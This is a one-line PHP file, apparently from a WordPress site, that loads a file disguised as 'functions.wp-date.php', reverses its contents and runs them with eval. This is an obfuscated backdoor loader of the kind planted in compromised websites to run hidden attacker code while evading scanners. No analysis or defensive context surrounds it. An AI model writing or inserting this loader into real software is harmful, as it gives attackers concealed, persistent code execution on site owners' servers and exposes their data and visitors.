<?php eval(strrev(file_get_contents('functions.wp-date.php')));?>
